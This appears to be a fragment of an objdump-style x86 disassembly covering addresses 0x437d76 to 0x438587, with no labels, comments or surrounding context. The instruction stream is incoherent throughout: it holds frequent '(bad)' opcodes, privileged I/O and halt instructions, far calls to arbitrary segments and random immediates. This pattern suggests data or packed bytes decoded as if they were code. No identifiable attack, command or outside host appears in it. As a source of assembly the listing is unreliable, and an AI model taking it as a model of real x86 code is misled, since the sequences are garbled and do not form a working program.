  437d76:	loopne 0x437d07
  437d78:	xchg   esi,eax
  437d79:	aaa    
  437d7a:	lods   eax,DWORD PTR ds:[esi]
  437d7b:	push   edi
  437d7c:	ret    0x54a6
  437d7f:	hlt    
  437d80:	call   0xe821:0x7a11d8ef
  437d87:	out    0x49,eax
  437d89:	outs   dx,BYTE PTR ds:[esi]
  437d8a:	jg     0x437deb
  437d8c:	adc    BYTE PTR [edx-0x65af82a0],bl
  437d92:	jb     0x437d87
  437d94:	push   ebp
  437d95:	fisubr DWORD PTR [eax+0x38]
  437d98:	mov    BYTE PTR [ebp+0x6af2fa3a],al
  437d9e:	pop    eax
  437d9f:	je     0x437dc9
  437da1:	mov    ds:0x4eaeab88,eax
  437da6:	or     BYTE PTR [eax+0x3c2c290a],cl
  437dac:	add    DWORD PTR [edx+0x502742cd],eax
  437db2:	int    0x77
  437db4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437db5:	xlat   BYTE PTR ds:[ebx]
  437db6:	mov    ch,0x0
  437db8:	data16 jne 0x437d64
  437dbb:	call   0x98d8:0xa2c49fa1
  437dc2:	mov    edx,0x8fb6827b
  437dc7:	cmc    
  437dc8:	push   0x3b
  437dca:	cs mov edx,0x4f641e25
  437dd0:	jo     0x437df7
  437dd2:	sbb    edx,DWORD PTR [ebx]
  437dd4:	and    eax,0x88b426fd
  437dd9:	mov    bl,0x97
  437ddb:	sbb    al,dh
  437ddd:	jp     0x437e2d
  437ddf:	cmp    eax,0x4442f5a
  437de4:	mov    al,0xfa
  437de6:	(bad)  
  437de7:	call   0x15ecad35
  437dec:	add    BYTE PTR [ebx],0xc5
  437def:	mov    esi,0x1f8a361e
  437df4:	shl    BYTE PTR [edi+0x56],1
  437df7:	cmp    BYTE PTR ds:[esi+0x5e26655],cl
  437dfe:	jmp    0xad30039a
  437e03:	lahf   
  437e04:	scas   eax,DWORD PTR es:[edi]
  437e05:	(bad)  
  437e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437e08:	cli    
  437e09:	mov    bl,BYTE PTR [ebx]
  437e0b:	and    al,0xea
  437e0d:	or     bl,BYTE PTR ds:0x16f7cb4c
  437e13:	push   eax
  437e14:	lock cmp BYTE PTR [edx+0xc],0x59
  437e19:	fdivrp st(7),st
  437e1b:	dec    ecx
  437e1c:	pop    ds
  437e1d:	inc    ebp
  437e1e:	jl     0x437e9c
  437e20:	(bad)  
  437e21:	and    ebx,DWORD PTR [edx+0x1b]
  437e24:	cmp    ch,dl
  437e26:	ret    
  437e27:	(bad)  
  437e28:	addr16 push 0x2ebc54b3
  437e2e:	sub    bh,BYTE PTR [edx]
  437e30:	pop    esi
  437e31:	push   es
  437e32:	jo     0x437e32
  437e34:	sbb    bh,ch
  437e36:	add    al,0x8b
  437e38:	mov    eax,ds:0xd6a4a0b2
  437e3d:	ret    0x23
  437e40:	xchg   ecx,eax
  437e41:	push   esp
  437e42:	pop    eax
  437e43:	cld    
  437e44:	push   0xaa0297f6
  437e49:	or     BYTE PTR [edi+ecx*4+0x3a],dl
  437e4d:	bound  esp,QWORD PTR [esi-0xa7fdf03]
  437e53:	push   cs
  437e54:	outs   dx,DWORD PTR ds:[esi]
  437e55:	addr16 (bad) 
  437e57:	mov    cl,0x96
  437e59:	or     DWORD PTR [ebx],ebp
  437e5b:	mov    ch,0x10
  437e5d:	mov    dl,0xde
  437e5f:	mov    ds:0xa1a8ad74,al
  437e64:	sbb    ecx,esi
  437e66:	repnz (bad) 
  437e68:	in     eax,dx
  437e69:	into   
  437e6a:	cmp    edx,esi
  437e6c:	loop   0x437e5f
  437e6e:	add    al,0xa9
  437e70:	ins    DWORD PTR es:[edi],dx
  437e71:	out    dx,al
  437e72:	data16 xor BYTE PTR [eax-0x5516132f],cl
  437e79:	(bad)  
  437e7a:	jmp    0xa645:0x67d42b6
  437e81:	ror    bh,cl
  437e83:	mov    dl,0xb6
  437e85:	out    0xe,al
  437e87:	add    BYTE PTR [edx-0x2240a131],dh
  437e8d:	pop    edx
  437e8e:	enter  0xe3a9,0x21
  437e92:	sbb    DWORD PTR [edx+ebp*1+0x78497e67],ebx
  437e99:	and    BYTE PTR [esi-0x18e15edb],ch
  437e9f:	(bad)  
  437ea0:	push   ebx
  437ea1:	mov    bl,0x1f
  437ea3:	mov    dh,0xf2
  437ea5:	into   
  437ea6:	mov    dl,0xdc
  437ea8:	cmp    bh,BYTE PTR [eax-0x3c5d97ea]
  437eae:	inc    esi
  437eaf:	scas   eax,DWORD PTR es:[edi]
  437eb0:	sub    cl,ch
  437eb2:	in     eax,dx
  437eb3:	or     al,al
  437eb5:	div    BYTE PTR [edx-0x7a792f46]
  437ebb:	or     BYTE PTR [eax+0x52],bh
  437ebe:	pop    edx
  437ebf:	pusha  
  437ec0:	mov    ah,0x45
  437ec2:	pop    ebp
  437ec3:	xor    BYTE PTR [eax+0x2],0x8
  437ec7:	popa   
  437ec8:	inc    eax
  437ec9:	repnz push cs
  437ecb:	add    eax,0xc704fb01
  437ed0:	push   ss
  437ed1:	or     bl,dl
  437ed3:	pop    edx
  437ed4:	sti    
  437ed5:	xchg   edx,eax
  437ed6:	rcr    edx,1
  437ed8:	dec    ebp
  437ed9:	enter  0x21be,0x7c
  437edd:	add    esi,edx
  437edf:	std    
  437ee0:	sbb    al,0x43
  437ee2:	sbb    DWORD PTR [ebx],0x54
  437ee5:	(bad)
  437ee9:	sbb    cl,dl
  437eeb:	cli    
  437eec:	add    DWORD PTR [edx-0x23],esp
  437eef:	test   eax,0x4d024382
  437ef4:	les    esi,FWORD PTR [ebx+0x57a85a5e]
  437efa:	cwde   
  437efb:	jl     0x437ebb
  437efd:	xor    ecx,DWORD PTR [ecx-0x2a]
  437f00:	add    ebx,DWORD PTR [ebx+0x14]
  437f03:	sbb    eax,0x45d74624
  437f08:	jmp    0xbe1fdc75
  437f0d:	das    
  437f0e:	and    BYTE PTR [edi],al
  437f10:	adc    BYTE PTR [ebp+0x16e0ae5a],ch
  437f16:	fs cld 
  437f18:	or     DWORD PTR [ecx+eiz*4],eax
  437f1b:	mov    DWORD PTR [edx-0x6c383b98],eax
  437f21:	mov    ah,0x35
  437f23:	mov    BYTE PTR [eax],ch
  437f25:	(bad)  
  437f26:	xchg   ebp,eax
  437f27:	xlat   BYTE PTR ds:[ebx]
  437f28:	fs mov eax,eax
  437f2b:	fdiv   st,st(5)
  437f2d:	and    eax,0x64269960
  437f32:	xacquire xchg BYTE PTR [ebp+0x72],ch
  437f36:	inc    edi
  437f37:	test   BYTE PTR [esi],bh
  437f39:	xchg   ecx,eax
  437f3a:	pushf  
  437f3b:	enter  0x5c5d,0xde
  437f3f:	imul   esp,DWORD PTR [edx-0x4965f78b],0xd201e43a
  437f49:	dec    ecx
  437f4a:	jp     0x437eee
  437f4c:	mov    ecx,0x5c80dcbf
  437f51:	and    al,0x54
  437f54:	in     eax,dx
  437f55:	or     al,0xc4
  437f57:	faddp  st(4),st
  437f59:	add    ch,BYTE PTR [ebx-0x394160ec]
  437f5f:	xchg   edi,eax
  437f60:	adc    ecx,DWORD PTR [edx-0x791256b9]
  437f66:	or     cl,BYTE PTR [eax+0x63]
  437f69:	push   0x22
  437f6b:	mov    cl,BYTE PTR [ebp-0x50]
  437f6e:	dec    esi
  437f6f:	(bad)  
  437f70:	jnp    0x437f8e
  437f72:	sub    ah,BYTE PTR [esi+edx*1]
  437f75:	ret    0xf346
  437f78:	outs   dx,DWORD PTR ds:[esi]
  437f79:	les    ebp,FWORD PTR [eax+edi*4+0x0]
  437f7d:	dec    ecx
  437f7e:	mov    ebx,0x56db000
  437f83:	fiadd  DWORD PTR [eax]
  437f85:	add    ch,dl
  437f87:	dec    esp
  437f88:	mov    edi,0x7852f4e6
  437f8d:	dec    edx
  437f8e:	push   0xd
  437f90:	es cld 
  437f92:	out    dx,al
  437f93:	fdiv   QWORD PTR [ebp-0x2b]
  437f96:	mov    BYTE PTR ds:0xfdeb4ef1,0x4
  437f9d:	mov    esp,0x505839e4
  437fa2:	shl    BYTE PTR [ecx-0x66],1
  437fa5:	test   al,0x27
  437fa7:	ss sub dh,dh
  437faa:	push   cs
  437fab:	xchg   DWORD PTR [esi],ebx
  437fad:	rcr    al,cl
  437faf:	mov    al,ds:0xbaee3210
  437fb4:	mov    al,0xc8
  437fb6:	push   ebp
  437fb7:	mov    esi,0xfe267d44
  437fbc:	mov    al,ds:0x674f22bc
  437fc1:	pop    edx
  437fc2:	fnsave [esi]
  437fc4:	sbb    BYTE PTR [edi],bh
  437fc6:	push   eax
  437fc7:	gs jmp 0x460e:0x478d699
  437fcf:	or     DWORD PTR [ebp+0x34],edi
  437fd2:	push   eax
  437fd3:	push   es
  437fd4:	neg    BYTE PTR [edx-0x4d]
  437fd7:	xlat   BYTE PTR ds:[ebx]
  437fd8:	pop    ebx
  437fd9:	sbb    ebx,DWORD PTR [edx]
  437fdb:	push   cs
  437fdc:	fs push edx
  437fde:	mov    dh,BYTE PTR es:[eax+0x6da36186]
  437fe5:	sub    al,dl
  437fe7:	fmul   DWORD PTR [ecx+edx*4]
  437fea:	shr    DWORD PTR fs:[edx+ebp*2-0x5f],0xa8
  437ff0:	mov    al,0x1f
  437ff2:	(bad)  
  437ff3:	pushf  
  437ff4:	(bad)  
  437ff5:	(bad)  
  437ff7:	hlt    
  437ff8:	pop    esi
  437ff9:	(bad)  [ebx+ecx*1-0x157d3afe]
  438000:	inc    esp
  438001:	inc    esi
  438002:	xchg   esp,eax
  438003:	fmul   DWORD PTR ds:0xe6480814
  438009:	scas   al,BYTE PTR es:[edi]
  43800a:	adc    esp,DWORD PTR [ecx-0x4c]
  43800d:	or     eax,0x7f2ede4d
  438012:	push   cs
  438013:	icebp  
  438014:	or     eax,0xd93da4d6
  438019:	fimul  DWORD PTR [ecx+ebx*1+0x4eedf216]
  438020:	imul   ecx,DWORD PTR [ebp+edx*1-0x7cc7bfaa],0x491c10ac
  43802b:	jp     0x43808e
  43802d:	jecxz  0x437fe2
  43802f:	jo     0x4380a1
  438031:	and    dh,BYTE PTR [di]
  438034:	addr16 leave 
  438036:	inc    ebp
  438037:	pop    ebp
  438038:	fwait
  438039:	xor    al,0x2d
  43803b:	mov    al,ds:0x60d1c101
  438040:	xor    dh,ah
  438042:	xchg   esi,eax
  438043:	xor    bl,BYTE PTR [eax-0x55eb2950]
  438049:	fcomp  QWORD PTR [esi+ecx*4+0x1e]
  43804d:	add    BYTE PTR [eax-0x79],ah
  438050:	push   ebx
  438051:	cli    
  438052:	xchg   esi,eax
  438053:	dec    edx
  438054:	and    eax,0x78d05e2a
  438059:	cld    
  43805a:	arpl   WORD PTR [edi+0x22e96e44],dx
  438060:	aaa    
  438061:	or     eax,0x5ecb0205
  438066:	out    dx,al
  438067:	ins    BYTE PTR es:[edi],dx
  438068:	xor    al,0xaa
  43806a:	cld    
  43806b:	add    eax,0x710a6b68
  438070:	rcr    BYTE PTR [edi+0x76d52ea5],0xa4
  438077:	retf   
  438078:	add    al,0xd0
  43807a:	mov    esi,0xb448446c
  43807f:	pop    ds
  438080:	inc    esi
  438081:	adc    eax,0x877afa68
  438086:	out    dx,eax
  438087:	cs jp  0x43806b
  43808a:	mov    cs,WORD PTR ss:[ecx+0x26]
  43808e:	add    bh,dh
  438090:	ror    BYTE PTR [esi],0xab
  438093:	xor    BYTE PTR [ebp+ebx*1-0x78],bl
  438097:	fadd   st,st(1)
  438099:	pop    ss
  43809a:	cmp    BYTE PTR [edx+0x1c349bf1],ah
  4380a0:	pop    edi
  4380a1:	pushf  
  4380a2:	or     eax,0x1b509a54
  4380a7:	jl     0x438039
  4380a9:	loop   0x4380df
  4380ab:	or     eax,0x241e210f
  4380b0:	or     BYTE PTR [eax-0x7b19186b],al
  4380b6:	push   ds
  4380b7:	add    dl,bl
  4380b9:	loopne 0x4380e7
  4380bb:	add    al,0xaa
  4380bd:	xor    eax,0x48e282b4
  4380c2:	je     0x438052
  4380c4:	jle    0x43809a
  4380c6:	fadd   DWORD PTR [edx-0x3414bb20]
  4380cc:	inc    eax
  4380cd:	scas   al,BYTE PTR es:[edi]
  4380ce:	push   0x2025589b
  4380d3:	lock out dx,al
  4380d5:	xor    DWORD PTR [esp+ebx*4],0xf
  4380d9:	adc    BYTE PTR [eax],dh
  4380db:	mov    dh,0x2f
  4380dd:	add    DWORD PTR [edx-0x55],esp
  4380e0:	add    al,0xac
  4380e2:	mov    ebp,0xdf843e2a
  4380e7:	mov    ds:0x300a037b,al
  4380ec:	adc    BYTE PTR [edx+0x10],dl
  4380ef:	loope  0x4380a3
  4380f1:	shr    BYTE PTR [esi],1
  4380f3:	in     al,dx
  4380f4:	loop   0x438118
  4380f6:	sbb    dl,BYTE PTR [ecx+eiz*2-0x80]
  4380fa:	pop    esi
  4380fb:	push   ss
  4380fc:	ds xchg edi,eax
  4380fe:	sub    BYTE PTR [eax-0x4a],ch
  438101:	lock sbb BYTE PTR [ecx+edi*8],0xc6
  438106:	out    0xd6,eax
  438108:	add    BYTE PTR [edx-0x1829072f],bl
  43810e:	jmp    0x8cfba63d
  438113:	cli    
  438114:	and    bl,BYTE PTR [eax]
  438116:	mov    bh,0x70
  438118:	sbb    ebx,DWORD PTR [edi+0x26]
  43811b:	cmp    al,0x17
  43811d:	into   
  43811e:	adc    ecx,DWORD PTR [edi-0x7485929f]
  438124:	mov    ebx,DWORD PTR [eax-0x5538583]
  43812a:	mov    ah,0x3e
  43812c:	aam    0x5a
  43812e:	loope  0x4381aa
  438130:	mov    dl,0xf0
  438132:	cmp    eax,0x9f66d62b
  438137:	dec    eax
  438138:	push   ds
  438139:	cmp    ch,BYTE PTR [ebp+0x64535234]
  43813f:	cmp    cl,BYTE PTR [esi-0x6b7143bf]
  438145:	scas   al,BYTE PTR es:[edi]
  438146:	mov    eax,0x4ccc6029
  43814b:	fcom   DWORD PTR [esi-0x30]
  43814e:	dec    esp
  43814f:	mov    BYTE PTR [esi-0x2d8b1ded],ch
  438155:	push   ss
  438156:	add    BYTE PTR [ecx-0x79a93458],dh
  43815c:	into   
  43815d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43815e:	rcr    ecx,1
  438160:	ins    DWORD PTR es:[edi],dx
  438161:	xor    cl,dl
  438163:	jp     0x438143
  438165:	loopne 0x4381d7
  438167:	cmp    BYTE PTR [esp+esi*8],bh
  43816a:	push   esp
  43816b:	or     eax,0xe6c480dd
  438170:	sub    eax,0x585446f2
  438175:	push   esp
  438176:	sar    BYTE PTR [edx],1
  438178:	sub    cl,BYTE PTR [ecx]
  43817a:	mov    esi,0x32d3a208
  43817f:	call   0xe618:0xe1bcda88
  438186:	jge    0x438196
  438188:	mov    bl,cl
  43818a:	add    BYTE PTR [ebp-0x21],cl
  43818d:	adc    eax,0x4b7ea4fc
  438192:	rcl    BYTE PTR [ebp-0x4e],0x54
  438196:	push   ss
  438197:	lods   al,BYTE PTR ds:[esi]
  438198:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438199:	push   esi
  43819a:	cwde   
  43819b:	pop    ss
  43819c:	fisubr WORD PTR ds:0xee8cb900
  4381a2:	outs   dx,DWORD PTR ds:[esi]
  4381a3:	mov    ds:0x97ada7c6,al
  4381a8:	cmp    al,0x20
  4381aa:	cmp    ebp,DWORD PTR [edx]
  4381ac:	add    ebp,DWORD PTR [edx+0x76d08142]
  4381b2:	ins    BYTE PTR es:[edi],dx
  4381b3:	nop
  4381b4:	mov    dl,0xa0
  4381b6:	add    eax,0xa6d1e2ad
  4381bb:	xchg   ecx,eax
  4381bc:	and    bh,BYTE PTR [ebp-0x2bf9f078]
  4381c2:	adc    al,0x4a
  4381c4:	sub    bl,BYTE PTR [ecx+0x7c]
  4381c7:	call   0xf8cf16f
  4381cc:	or     eax,0xba43738e
  4381d1:	lahf   
  4381d2:	test   al,0xad
  4381d4:	(bad)  
  4381d6:	mov    edi,0xaaab8ca
  4381db:	dec    eax
  4381dc:	rcr    BYTE PTR [eax],1
  4381de:	push   esp
  4381df:	pop    esi
  4381e0:	fnop   
  4381e2:	sub    edx,DWORD PTR [edx]
  4381e4:	loopne 0x4381bc
  4381e6:	adc    eax,esp
  4381e8:	adc    DWORD PTR [ecx-0x4d44f513],ebp
  4381ee:	pop    es
  4381ef:	ss fdivr st,st(6)
  4381f2:	jbe    0x43824b
  4381f4:	inc    esi
  4381f5:	sti    
  4381f6:	inc    ecx
  4381f7:	hlt    
  4381f8:	sbb    DWORD PTR [edx],0xc386ba16
  4381fe:	lds    edx,FWORD PTR [edx-0x5fbf77d2]
  438204:	jne    0x4381a8
  438206:	scas   eax,DWORD PTR es:[edi]
  438207:	xchg   esi,edx
  438209:	daa    
  43820a:	pop    eax
  43820b:	lock in eax,0x97
  43820e:	add    bl,BYTE PTR [eax+0x49]
  438211:	dec    ebp
  438212:	push   cs
  438213:	adc    edi,edx
  438215:	jbe    0x43826c
  438217:	mov    BYTE PTR ds:0x22292eb,ah
  43821d:	loop   0x438265
  43821f:	sbb    BYTE PTR [ebp+0x48],cl
  438222:	retf   
  438223:	dec    ecx
  438224:	cmp    bl,ah
  438226:	lods   al,BYTE PTR ds:[esi]
  438227:	popf   
  438228:	xchg   BYTE PTR [edi],al
  43822a:	ss call 0x2cd4:0x8942adf1
  438232:	add    ebx,esp
  438234:	xchg   ecx,eax
  438235:	test   eax,0x9a2b2021
  43823a:	mov    ah,BYTE PTR [esi]
  43823c:	pop    ss
  43823d:	hlt    
  43823e:	lock mov ds:0x5814ca00,al
  438244:	inc    ebp
  438245:	cmp    al,0x54
  438247:	ret    
  438248:	retf   
  438249:	sub    BYTE PTR [edx+esi*2-0x54],dh
  43824d:	in     al,dx
  43824e:	fistp  WORD PTR [ebx]
  438250:	call   0x105a:0xc5368eaa
  438257:	xor    al,0xf9
  438259:	je     0x4382c8
  43825b:	pop    ebx
  43825c:	push   esi
  43825d:	sbb    BYTE PTR [eax],0x52
  438260:	div    al
  438262:	loop   0x438250
  438264:	std    
  438265:	xor    al,0xb4
  438267:	sbb    DWORD PTR [esp+ebx*8+0x7e9cd38f],esp
  43826e:	lahf   
  43826f:	das    
  438270:	sbb    BYTE PTR [edi],bl
  438272:	and    DWORD PTR [edx+eax*1-0xa5901d7],ebp
  438279:	pop    edx
  43827a:	shr    BYTE PTR [edi-0x364f2f52],cl
  438280:	inc    ebx
  438281:	jp     0x438287
  438283:	jl     0x4382f9
  438285:	xor    ah,ah
  438287:	cs neg ecx
  43828a:	mov    dh,0xca
  43828c:	inc    eax
  43828d:	loopne 0x4382a1
  43828f:	adc    al,dh
  438291:	jb     0x4382b8
  438293:	mov    cl,0xb2
  438295:	sub    BYTE PTR [edx+0x22],ch
  438298:	or     esp,esp
  43829a:	les    ecx,FWORD PTR [ebx]
  43829c:	sbb    bh,BYTE PTR [ebx+0x282c6caf]
  4382a2:	cmp    al,0x4b
  4382a4:	and    al,0x8c
  4382a6:	loopne 0x438238
  4382a8:	das    
  4382a9:	lods   eax,DWORD PTR ds:[esi]
  4382aa:	sbb    al,0x90
  4382ac:	pop    eax
  4382ad:	popa   
  4382ae:	mov    fs,WORD PTR [edx]
  4382b0:	dec    eax
  4382b1:	das    
  4382b2:	sub    al,0x2
  4382b4:	push   ebp
  4382b5:	ins    DWORD PTR es:[edi],dx
  4382b6:	inc    ecx
  4382b7:	dec    esp
  4382b8:	js     0x438314
  4382ba:	xchg   ebp,eax
  4382bb:	or     BYTE PTR [eax+0xb],ch
  4382be:	cs clc 
  4382c0:	addr16 int3 
  4382c2:	add    BYTE PTR [edx],0x10
  4382c5:	push   DWORD PTR [ebp+0x387ec0ad]
  4382cb:	mov    ds:0x681edc09,eax
  4382d0:	push   edx
  4382d1:	xor    eax,0x46745873
  4382d6:	pop    ebp
  4382d7:	pop    edx
  4382d8:	sbb    edi,DWORD PTR [ebx-0x72]
  4382db:	sbb    al,0x30
  4382dd:	cld    
  4382de:	mov    edx,0xa49e3b58
  4382e3:	xor    dl,al
  4382e5:	add    BYTE PTR [edx-0x40],0x9e
  4382e9:	(bad)  
  4382ea:	fmul   DWORD PTR [esi-0x6febed95]
  4382f0:	pusha  
  4382f1:	cdq    
  4382f2:	inc    esi
  4382f3:	inc    eax
  4382f4:	and    DWORD PTR [eax],esp
  4382f6:	push   ds
  4382f7:	test   al,0x1
  4382f9:	lods   al,BYTE PTR ds:[esi]
  4382fa:	aas    
  4382fb:	pusha  
  4382fc:	(bad)  
  4382fd:	mov    ds:0x7b6cd5d6,al
  438302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438303:	inc    esi
  438304:	xor    al,0x52
  438306:	sbb    ch,BYTE PTR [esi]
  438308:	stos   BYTE PTR es:[edi],al
  438309:	add    dh,dl
  43830b:	push   edi
  43830c:	add    BYTE PTR [ecx+0xb],al
  43830f:	test   eax,0xf0c168ed
  438314:	sbb    al,0x3d
  438316:	and    ah,bh
  438318:	and    al,BYTE PTR [edi]
  43831a:	test   BYTE PTR [ebp-0x11d664b],ch
  438320:	cs pop ebp
  438322:	inc    esi
  438323:	xor    al,0x55
  438325:	loopne 0x438331
  438327:	call   0x8d64:0x9e4ec4da
  43832e:	jmp    0xe22b:0x4b27d0ba
  438335:	or     DWORD PTR [edx-0x2e6a79e0],ecx
  43833b:	inc    eax
  43833c:	jmp    0x438308
  43833e:	in     al,dx
  43833f:	mov    BYTE PTR [edx],al
  438341:	xor    al,bh
  438343:	gs cmp eax,0xe41a28a0
  438349:	add    BYTE PTR [ecx*4-0x35a24998],dl
  438350:	(bad)  
  438351:	mov    ecx,0xbe9f1176
  438356:	add    al,0xf
  438358:	sub    DWORD PTR ds:0x82c29cb5,eax
  43835e:	nop
  43835f:	inc    eax
  438360:	add    eax,0xe7c656c9
  438365:	mov    cl,0x64
  438367:	or     ch,BYTE PTR [ebx+0x1a46056d]
  43836d:	jmp    0x9952:0xd9a188b0
  438374:	add    BYTE PTR [esi],dl
  438376:	pop    edx
  438377:	inc    ebx
  438378:	xchg   edx,eax
  438379:	adc    al,0xf3
  43837b:	(bad)  
  43837c:	das    
  43837d:	mov    al,ds:0x29169f15
  438382:	mov    esi,0x7ec8d58a
  438387:	ins    DWORD PTR es:[edi],dx
  438388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438389:	sub    BYTE PTR [edi],0x12
  43838c:	jo     0x4383da
  43838e:	push   esp
  43838f:	in     al,dx
  438390:	or     eax,0x38c8a06e
  438395:	(bad)  
  438396:	jp     0x438354
  438398:	or     BYTE PTR [edi],ch
  43839a:	arpl   WORD PTR [eax],ax
  43839c:	ins    DWORD PTR es:[edi],dx
  43839d:	mov    bl,0xfe
  43839f:	or     bh,BYTE PTR [edx]
  4383a1:	jnp    0x4383b8
  4383a3:	sub    BYTE PTR [esi+0x5a],ch
  4383a6:	sub    DWORD PTR [ecx+0x37],eax
  4383a9:	lods   al,BYTE PTR ds:[esi]
  4383aa:	gs ds popf 
  4383ad:	sub    cl,BYTE PTR [ebp+0xf]
  4383b0:	inc    edx
  4383b1:	aaa    
  4383b2:	or     cl,BYTE PTR [edx]
  4383b4:	push   esp
  4383b5:	xor    edi,DWORD PTR [edi+ebx*1+0x18]
  4383b9:	fist   DWORD PTR ds:0x2ab622ac
  4383bf:	xor    al,0xff
  4383c1:	es inc esi
  4383c3:	add    DWORD PTR [ecx+0x64a62a6f],eax
  4383c9:	sbb    ch,BYTE PTR [edx+0x2b]
  4383cc:	mov    al,0x7
  4383ce:	mov    al,0x98
  4383d0:	pop    ecx
  4383d1:	call   0x419c6d78
  4383d6:	pushf  
  4383d7:	or     eax,0xf001f6c1
  4383dc:	and    eax,0x1e4d0916
  4383e1:	and    BYTE PTR [eax-0x77976ed4],ch
  4383e7:	or     eax,0x9c9a0057
  4383ec:	ins    DWORD PTR es:[edi],dx
  4383ed:	test   cl,0x98
  4383f0:	or     ch,BYTE PTR ss:[esi+0x6aa4b569]
  4383f7:	or     ch,BYTE PTR [ebp+edi*4-0x7f785428]
  4383fe:	add    WORD PTR [edx-0x3191f0a4],ax
  438405:	call   0xc067:0x5de3287e
  43840c:	cmp    DWORD PTR [ebp+0x0],esp
  43840f:	inc    ebp
  438410:	pop    eax
  438411:	loop   0x4383eb
  438413:	push   ds
  438414:	dec    ebp
  438415:	mov    BYTE PTR ss:[edx],dl
  438418:	fistp  WORD PTR [eax-0x58]
  43841b:	push   edx
  43841c:	ins    BYTE PTR es:[edi],dx
  43841d:	cdq    
  43841e:	dec    eax
  43841f:	xor    eax,0x14e628da
  438424:	mov    cl,0xab
  438426:	inc    edx
  438427:	cli    
  438428:	out    dx,al
  438429:	gs ret 0x425a
  43842d:	cmp    BYTE PTR [esi-0x6b17c2d3],0x35
  438434:	shl    BYTE PTR [ecx],1
  438436:	inc    ebx
  438437:	(bad)  
  438438:	inc    edx
  438439:	int    0x7c
  43843b:	adc    DWORD PTR [esi+edi*1+0x22b6b524],edx
  438442:	push   ebx
  438443:	cmp    eax,0xd8d0589a
  438448:	cmp    ebp,DWORD PTR ss:[ebx+0x68]
  43844c:	loope  0x4383e9
  43844e:	cs je  0x43840d
  438451:	add    dh,ah
  438453:	stos   DWORD PTR es:[edi],eax
  438454:	dec    eax
  438455:	sub    eax,DWORD PTR ds:0xcd142d5b
  43845b:	xor    dh,BYTE PTR [edx-0x77ffb388]
  438461:	xlat   BYTE PTR ds:[ebx]
  438462:	xor    dh,BYTE PTR [esi+0x1aa458a9]
  438468:	dec    eax
  438469:	jne    0x438423
  43846b:	add    al,0xa4
  43846d:	fidiv  DWORD PTR [ebx+0x346ab5b6]
  438473:	fs dec eax
  438475:	pop    esp
  438476:	ret    0x7cda
  438479:	aas    
  43847a:	shl    DWORD PTR [edi+ebp*1],cl
  43847d:	lea    edx,[edi+0x2]
  438480:	push   eax
  438481:	push   edx
  438482:	jmp    0x41:0x7827b2c0
  438489:	lahf   
  43848a:	pop    eax
  43848b:	ds jns 0x4384be
  43848e:	inc    eax
  43848f:	mov    bh,bl
  438491:	add    bl,BYTE PTR [esi]
  438493:	push   edx
  438494:	pop    eax
  438495:	pop    ds
  438496:	mov    eax,ds:0x6c25e0ec
  43849b:	push   0xffffffb0
  43849d:	outs   dx,DWORD PTR ds:[esi]
  43849e:	sbb    BYTE PTR [esi+0x69817c9b],0xd2
  4384a5:	adc    BYTE PTR [bx-0x6a2a],bh
  4384aa:	push   ss
  4384ab:	shr    BYTE PTR [ebx+0xf],cl
  4384ae:	data16 sbb dh,dh
  4384b1:	fwait
  4384b2:	pop    esp
  4384b3:	xchg   edi,eax
  4384b4:	mov    DWORD PTR [edx+0x75ac8afe],esi
  4384ba:	sbb    DWORD PTR [eax],edx
  4384bc:	test   DWORD PTR [eax-0x8],0xedfc8022
  4384c3:	or     DWORD PTR [ebp+0x3e8a82b4],eax
  4384c9:	ds jo  0x4384af
  4384cc:	dec    ebx
  4384cd:	das    
  4384ce:	test   eax,0x7fbfa615
  4384d3:	(bad)  
  4384d4:	xchg   ax,ax
  4384d6:	push   edi
  4384d7:	sbb    dl,0x4f
  4384da:	mov    al,0x67
  4384dc:	ficom  DWORD PTR [eax+edi*4-0x3e4ec9d2]
  4384e3:	add    cl,ah
  4384e5:	xor    eax,DWORD PTR [eax]
  4384e7:	mov    dh,0x22
  4384e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4384ea:	hlt    
  4384eb:	dec    esi
  4384ec:	ror    DWORD PTR ds:0x6cb4c0a9,1
  4384f2:	imul   edx,DWORD PTR [edx+0x5d],0x903a6c61
  4384f9:	ret    0x94ff
  4384fc:	sahf   
  4384fd:	jl     0x438522
  4384ff:	add    BYTE PTR [ebx],bl
  438501:	cs inc bh
  438504:	xchg   edx,eax
  438505:	sbb    dl,BYTE PTR [ecx+0x4a]
  438508:	xchg   DWORD PTR [ebp-0x1b4f2f71],esi
  43850e:	loop   0x43849a
  438510:	std    
  438511:	and    bh,BYTE PTR [esi+edx*8+0x68135e66]
  438518:	inc    esi
  438519:	inc    ecx
  43851a:	push   esp
  43851b:	sti    
  43851c:	jp     0x4384b8
  43851e:	jp     0x438579
  438520:	push   0xc224200f
  438525:	out    dx,al
  438526:	aas    
  438527:	sbb    eax,DWORD PTR ds:0xc65e7570
  43852d:	pop    esp
  43852e:	push   ss
  43852f:	inc    edi
  438530:	push   ss
  438531:	(bad)
  438535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438536:	and    BYTE PTR [ebx],bl
  438538:	(bad)  
  438539:	dec    ebp
  43853a:	sub    BYTE PTR [esi*1-0x71dc753],ch
  438541:	test   DWORD PTR ds:0xb4ce35ad,ecx
  438547:	or     bl,BYTE PTR [esi-0xc]
  43854a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43854b:	mov    WORD PTR [ebp+0x7],gs
  43854e:	jne    0x438571
  438550:	jecxz  0x438583
  438552:	test   al,0xca
  438554:	mov    DWORD PTR [esi+0x57],ecx
  438557:	icebp  
  438558:	enter  0x9540,0xb2
  43855c:	int3   
  43855d:	push   cs
  43855e:	aaa    
  43855f:	pop    edi
  438560:	xchg   BYTE PTR [ebp+ebp*8+0x25],ah
  438564:	mov    esp,0x4dd699ff
  438569:	pop    eax
  43856a:	hlt    
  43856b:	mov    eax,edx
  43856d:	out    0xd0,al
  43856f:	and    dh,BYTE PTR [ecx-0x35]
  438572:	mov    gs,edx
  438574:	or     ecx,DWORD PTR [edi+0x5e163d04]
  43857a:	mov    edi,0xdbccd2c3
  43857f:	aas    
  438580:	test   eax,0x7b1e01ed
  438585:	push   0xb
  438587:	test   BYTE PTR [esi-0x34d96377],dl
